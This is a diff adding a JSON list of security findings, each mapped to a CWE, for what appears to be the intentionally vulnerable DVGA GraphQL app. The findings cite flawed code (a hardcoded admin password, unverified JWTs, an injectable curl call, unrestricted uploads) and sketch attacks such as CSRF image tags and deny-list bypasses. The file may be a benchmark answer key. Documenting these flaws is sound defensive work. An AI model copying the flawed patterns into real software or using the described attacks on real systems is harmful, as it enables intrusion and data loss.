+          "proof": "setup.py:53 defines random_password() to always return 'changeme' from a single-element list. On line 65 this is assigned to the admin user: admin = User(username='admin', ..., password=random_password()). Combined with plaintext password storage in the User model, this is a trivially guessable credential for the highest-privilege account."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "core/views.py",
+      "start": {
+        "line": 428
+      },
+      "end": {
+        "line": 428
+      },
+      "extra": {
+        "message": "CSRF on GET /start_over Route Resets Entire Database",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "@app.route('/start_over')\ndef start_over():\n  msg = \"Restored to default state.\"\n  res = helpers.initialize()",
+          "proof": "The /start_over route accepts GET requests with no CSRF token, no authentication, and no confirmation. It calls helpers.initialize() which executes os.popen('python3 setup.py') \u2014 deleting and recreating the entire database. An attacker can craft an <img> tag or link pointing to /start_over; any authenticated admin who visits the attacker's page will have their database silently wiped."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "core/views.py",
+      "start": {
+        "line": 443
+      },
+      "end": {
+        "line": 443
+      },
+      "extra": {
+        "message": "CSRF on GET /difficulty/<level> Downgrades Server-Wide Security Mode",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "@app.route('/difficulty/<level>')\ndef difficulty(level):\n  ...\n  helpers.set_mode(level)",
+          "proof": "The /difficulty/<level> route accepts GET requests with no CSRF protection or authentication. A GET to /difficulty/easy downgrades the server-wide security mode, disabling all middleware protections (depth, cost, introspection, deny list) for every client. An attacker can embed a hidden <img src='/difficulty/easy'> on any page to silently disarm the entire application."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "core/views.py",
+      "start": {
+        "line": 429
+      },
+      "end": {
+        "line": 429
+      },
+      "extra": {
+        "message": "Unauthenticated /audit Flask Route Exposes All GraphQL Queries Including Credentials",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "audit = Audit.query.order_by(Audit.timestamp.desc())\n  return render_template(\"audit.html\", audit=audit)",
+          "proof": "The /audit Flask route (line 427-430) queries ALL Audit records and renders them to any visitor without authentication. The audit table stores raw GraphQL queries; the clean_query() regex in models.py uses fragile lookahead/lookbehind patterns that fail to mask tokens/passwords in non-standard formats, and subscription audit entries bypass clean_query entirely. Any unauthenticated user visiting /audit can harvest credentials from previous queries."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 92
+      },
+      "end": {
+        "line": 92
+      },
+      "extra": {
+        "message": "Missing Authorization on CreateUser Mutation \u2014 Anyone Can Create Accounts",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "class CreateUser(graphene.Mutation):\n  class Arguments:\n    user_data = UserInput(required=True)\n  ...\n  def mutate(root, info, user_data=None):\n    user_obj = User.create_user(\n      username=user_data.username,\n      email=user_data.email,\n      password=user_data.password\n    )",
+          "proof": "The CreateUser mutation (line 92) has no authentication or authorization check. Any anonymous client can invoke createUser to register arbitrary accounts with any username, email, and password, enabling account stuffing and resource exhaustion attacks on the database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 184
+      },
+      "end": {
+        "line": 184
+      },
+      "extra": {
+        "message": "Missing Authorization on UploadPaste Mutation \u2014 Unauthenticated File Write to Server",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def mutate(self, info, filename, content):\n    result = helpers.save_file(filename, content)",
+          "proof": "The UploadPaste mutation (line 184) has no authentication requirement and calls helpers.save_file which writes user-supplied content to a user-supplied filename under WEB_UPLOADDIR. An unauthenticated attacker can write arbitrary files anywhere the web server user has write access."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 206
+      },
+      "end": {
+        "line": 206
+      },
+      "extra": {
+        "message": "Missing Authorization on ImportPaste Mutation \u2014 Unauthenticated SSRF + Command Execution",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def mutate(self, info, host='pastebin.com', port=443, path='/', scheme=\"http\"):\n    url = security.strip_dangerous_characters(f\"{scheme}://{host}:{port}{path}\")\n    cmd = helpers.run_cmd(f'curl --insecure {url}')",
+          "proof": "The ImportPaste mutation (line 200) has no authentication requirement. Any anonymous client can trigger curl requests to arbitrary URLs (SSRF) and, in easy mode where strip_dangerous_characters is a no-op, inject shell metacharacters for remote code execution via the host/path/scheme parameters passed to run_cmd."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-16",
+      "path": "app.py",
+      "start": {
+        "line": 9
+      },
+      "end": {
+        "line": 9
+      },
+      "extra": {
+        "message": "Missing ALLOWED_HOSTS Configuration \u2014 Flask Accepts Requests for Any Host Header",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-16"
+          ],
+          "citation": "app = Flask(__name__, static_folder=\"static/\")",
+          "proof": "The Flask application is created on app.py:9 with no ALLOWED_HOSTS or host validation configuration. Flask's default behavior accepts HTTP requests with any Host header, enabling HTTP Host header injection attacks, cache poisoning, and password reset poisoning when the application constructs absolute URLs from the Host header."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-614",
+      "path": "app.py",
+      "start": {
+        "line": 9
+      },
+      "end": {
+        "line": 9
+      },
+      "extra": {
+        "message": "Session Cookies Missing Secure and SameSite Flags",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-614"
+          ],
+          "citation": "app = Flask(__name__, static_folder=\"static/\")",
+          "proof": "No SESSION_COOKIE_SECURE or SESSION_COOKIE_SAMESITE configuration is set anywhere in app.py. Flask defaults SESSION_COOKIE_SECURE to False and SESSION_COOKIE_SAMESITE to None, meaning session cookies are transmitted over unencrypted HTTP and have no SameSite restriction. Combined with the static SECRET_KEY on line 14 ('dvga'), sessions can be forged and potentially used cross-origin."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "core/models.py",
+      "start": {
+        "line": 50
+      },
+      "end": {
+        "line": 50
+      },
+      "extra": {
+        "message": "Subscription Audit Entries Store Raw GraphQL Queries Without Credential Masking",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "if subscription_type and isinstance(info, str):\n      \"\"\"Subscriptions\"\"\"\n      gql_query = info",
+          "proof": "In Audit.create_audit_entry (line 47), when processing WebSocket subscriptions, the raw GraphQL query string is stored directly as gql_query = info without calling clean_query(). The clean_query() regex masking is only applied to queries/mutations (lines 69-78). Any tokens or passwords present in subscription payloads are logged in cleartext to the audit table and exposed via the unauthenticated /audit route and audits GraphQL query."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "core/models.py",
+      "start": {
+        "line": 26
+      },
+      "end": {
+        "line": 26
+      },
+      "extra": {
+        "message": "Inadequate Credential Masking in clean_query() \u2014 Regex Fails on Non-Standard Formats",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "def clean_query(gql_query):\n  clean = re.sub(r'(?<=token:\")(.*)(?=\")', \"*****\", gql_query)\n  clean = re.sub(r'(?<=password:\")(.*)(?=\")', \"*****\", clean)\n  return clean",
+          "proof": "clean_query() uses greedy regex with unanchored lookbehind/lookahead. It only matches token:\"...\" and password:\"...\" (lowercase, colon, double-quotes, no whitespace). Variants like 'Password', 'PASSWORD', 'token : \"...\"', single-quoted values, or tokens passed as GraphQL variables ($token) are NOT masked and stored in cleartext in the audit table, then exposed via the unauthenticated /audit endpoint."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-256",
+      "path": "core/security.py",
+      "start": {
+        "line": 52
+      },
+      "end": {
+        "line": 52
+      },
+      "extra": {
+        "message": "Plaintext Password Storage and Comparison",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-256"
+          ],
+          "citation": "if password == real_password:",
+          "proof": "The User model stores password as a plaintext db.String(60) column. check_creds() compares attacker-supplied password directly to the stored plaintext password with no hashing. An attacker with any database read access (SQL injection, backup exposure, /audit endpoint) can harvest all user passwords in cleartext. The comparison at security.py:52 is the sink where the plaintext value is used."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-287",
+      "path": "core/views.py",
+      "start": {
+        "line": 286
+      },
+      "end": {
+        "line": 286
+      },
+      "extra": {
+        "message": "Broken JWT Verification on me Query \u2014 Any Token Is Accepted",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-287"
+          ],
+          "citation": "identity = get_identity(token)",
+          "proof": "The resolve_me resolver (line 283) accepts a user-supplied token and passes it to get_identity() in helpers.py, which decodes the JWT with verify_signature=False and verify_exp=False (line 21). This means ANY crafted JWT payload is accepted \u2014 an attacker can forge a token with {\"identity\": \"admin\"} and impersonate any user, retrieving their profile data including the plaintext password field exposed by resolve_password in UserObject."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "core/views.py",
+      "start": {
+        "line": 339
+      },
+      "end": {
+        "line": 339
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on systemDiagnostics Authentication",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "res, msg = security.check_creds(username, password, real_passw)",
+          "proof": "The resolve_system_diagnostics resolver (line 337) accepts attacker-controlled username and password from the GraphQL query and calls check_creds() with no throttling, rate limiting, or account lockout. The admin password can be brute-forced via repeated GraphQL queries. On successful authentication, the resolver also executes arbitrary commands via helpers.run_cmd(cmd), compounding the impact."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-693",
+      "path": "core/parser.py",
+      "start": {
+        "line": 8
+      },
+      "end": {
+        "line": 8
+      },
+      "extra": {
+        "message": "Depth protection bypass due to broken depth parser",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-693"
+          ],
+          "citation": "if i == '{':",
+          "proof": "SOURCE: User-supplied GraphQL query string -> get_depth() splits on whitespace with str.split(). SINK: In minified GraphQL (e.g., '{user{posts{comments}}}'), braces are never isolated whitespace tokens, so 'depth' is always 0. DepthProtectionMiddleware never blocks deep recursion, enabling stack/memory exhaustion DoS via nested fragments."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-693",
+      "path": "core/middleware.py",
+      "start": {
+        "line": 95
+      },
+      "end": {
+        "line": 95
+      },
+      "extra": {
+        "message": "Deny-list bypass for batched GraphQL queries",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-693"
+          ],
+          "citation": "if isinstance(info.context.json, dict):",
+          "proof": "SOURCE: Batched GraphQL request where info.context.json is a list. SINK: processMiddleware only handles the dict case \u2014 it has no 'elif isinstance(..., list)' branch like DepthProtectionMiddleware and CostProtectionMiddleware do. When the payload is a list, array_qry stays empty and the deny-list loop never runs, so blocked queries such as 'systemHealth' pass through unblocked in hard mode."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "core/views.py",
+      "start": {
+        "line": 298
+      },
+      "end": {
+        "line": 298
+      },
+      "extra": {
+        "message": "Unbounded result set in resolve_search enables memory-exhaustion DoS",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "def resolve_search(self, info, keyword=None):",
+          "proof": "SOURCE: An unauthenticated GraphQL query to 'search' with no 'keyword' argument. SINK: Paste.query.all() and User.query.all() (lines 308-310) load every row from both tables into Python lists with NO limit, offset, or pagination. An attacker can call this repeatedly to exhaust server RAM, especially after seeding many pastes via the unauthenticated createPaste mutation."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-204",
+      "path": "core/security.py",
+      "start": {
+        "line": 48
+      },
+      "end": {
+        "line": 48
+      },
+      "extra": {
+        "message": "Observable response discrepancy in check_creds enables admin username enumeration",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-204"
+          ],
+          "citation": "def check_creds(username, password, real_password):\n  if username != 'admin':\n    return (False, 'Username is invalid')\n  if password == real_password:\n    return (True, 'Password Accepted.')\n  return (False, 'Password Incorrect')",
+          "proof": "SOURCE: An attacker provides arbitrary username/password to resolve_system_diagnostics (views.py line 346). SINK: check_creds returns distinct error strings: 'Username is invalid' when username != 'admin' (line 50), versus 'Password Incorrect' when username IS 'admin' but password is wrong (line 55). This binary oracle lets anyone verify 'admin' is a valid account, then brute-force the plaintext password."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "core/views.py",
+      "start": {
+        "line": 98
+      },
+      "end": {
+        "line": 98
+      },
+      "extra": {
+        "message": "Missing rate limiting on CreateUser mutation enables mass account creation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "def mutate(root, info, user_data=None):",
+          "proof": "SOURCE: An unauthenticated GraphQL mutation to 'createUser'. SINK: User.create_user(...) inserts a new row into the users table with no throttling, CAPTCHA, or lockout. An attacker can send thousands of mutations in rapid succession, filling the database with junk accounts."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "core/helpers.py",
+      "start": {
+        "line": 21
+      },
+      "end": {
+        "line": 21
+      },
+      "extra": {
+        "message": "JWT token expiration bypass in get_identity \u2014 expired tokens remain valid indefinitely",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "return decode(token, options={\"verify_signature\":False, \"verify_exp\":False}).get('identity')",
+          "proof": "SOURCE: The resolve_me query (views.py line 379) calls get_identity(token) with a token the attacker controls. SINK: decode() with verify_exp=False (helpers.py:21) skips expiration validation entirely. Even though app.py sets JWT_ACCESS_TOKEN_EXPIRES=120, those settings are never checked. An attacker who obtains a valid token can reuse it forever, bypassing session expiration."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-434",
+      "path": "core/views.py",
+      "start": {
+        "line": 186
+      },
+      "end": {
+        "line": 186
+      },
+      "extra": {
+        "message": "Unrestricted file upload without content-type or extension validation in UploadPaste",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-434"
+          ],
+          "citation": "result = helpers.save_file(filename, content)",
+          "proof": "SOURCE: UploadPaste mutation accepts user-supplied filename and content strings. SINK: helpers.save_file() (helpers.py:25) writes content to WEB_UPLOADDIR + filename with no validation of file extension, MIME type, or magic bytes. An attacker can upload executable scripts (.py, .php, .sh) or web shells to the upload directory."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "core/views.py",
+      "start": {
+        "line": 308
+      },
+      "end": {
+        "line": 308
+      },
+      "extra": {
+        "message": "Denial of service via unbounded resolve_search without keyword returns all rows",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "queryset1 = Paste.query.all()\n      items.extend(queryset1)\n      queryset2 = User.query.all()\n      items.extend(queryset2)",
+          "proof": "SOURCE: resolve_search called without keyword argument (line 298). SINK: Paste.query.all() and User.query.all() (lines 308-310) execute with no LIMIT or pagination, loading both full tables into memory and returning them. An attacker can call this repeatedly to exhaust server memory and database connections."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "core/views.py",
+      "start": {
+        "line": 322
+      },
+      "end": {
+        "line": 322
+      },
+      "extra": {
+        "message": "Denial of service via unbounded user-controlled limit parameter in resolve_pastes",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "return result.order_by(Paste.id.desc()).limit(limit)",
+          "proof": "SOURCE: resolve_pastes (line 314) accepts a user-controlled limit parameter with default 1000 but no maximum bound. SINK: .limit(limit) at line 322 passes the attacker-supplied value directly to the database query. An attacker can supply limit=9999999999, forcing the database to materialize an arbitrarily large result set, consuming memory and database resources."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "core/views.py",
+      "start": {
+        "line": 376
+      },
+      "end": {
+        "line": 376
+      },
+      "extra": {
+        "message": "Denial of service via unbounded resolve_users returns all users without limit",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "result = query",
+          "proof": "SOURCE: resolve_users called without an id argument (line 370). SINK: When id is not provided, the unfiltered query object is returned at line 376, which resolves to all User rows with no LIMIT or pagination. An attacker can call this repeatedly to exhaust server memory."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "core/views.py",
+      "start": {
+        "line": 118
+      },
+      "end": {
+        "line": 118
+      },
+      "extra": {
+        "message": "Missing authorization on CreatePaste mutation",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def mutate(self, info, title, content, public, burn):",
+          "proof": "SOURCE: CreatePaste mutation is exposed through the GraphQL endpoint without any authentication or authorization check. SINK: Paste.create_paste(...) creates pastes under the fixed DVGAUser owner. An unauthenticated attacker can create arbitrary pastes (including private and burn-after-reading), polluting the paste database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "core/views.py",
+      "start": {
+        "line": 98
+      },
+      "end": {
+        "line": 98
+      },
+      "extra": {
+        "message": "No rate limiting on CreateUser registration",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "def mutate(root, info, user_data=None):",
+          "proof": "SOURCE: The createUser mutation (line 92) has no throttling, CAPTCHA, or account-creation lockout. SINK: User.create_user(...) inserts into the users table with no rate check. An attacker can automate registration requests to mass-create accounts and fill the database, and combine with username enumeration from the login oracle."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-204",
+      "path": "core/models.py",
+      "start": {
+        "line": 20
+      },
+      "end": {
+        "line": 20
+      },
+      "extra": {
+        "message": "User Enumeration via CreateUser Duplicate-Key Error",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-204"
+          ],
+          "citation": "db.session.commit()",
+          "proof": "Untrusted input user_data.username and user_data.email flow from CreateUser.mutate (core/views.py:99-106) into User.create_user (core/models.py:17-21). The db.session.commit() at line 20 triggers a SQLAlchemy IntegrityError when a UNIQUE constraint on username or email is violated. No exception handling exists in either create_user or CreateUser.mutate, so the raw IntegrityError message (e.g., 'UNIQUE constraint failed: users.username') propagates through format_custom_error to the GraphQL response. An attacker can probe for existing accounts by observing whether the mutation succeeds or returns a constraint-violation error."
+        }
+      }
+    }
+  ]
+}
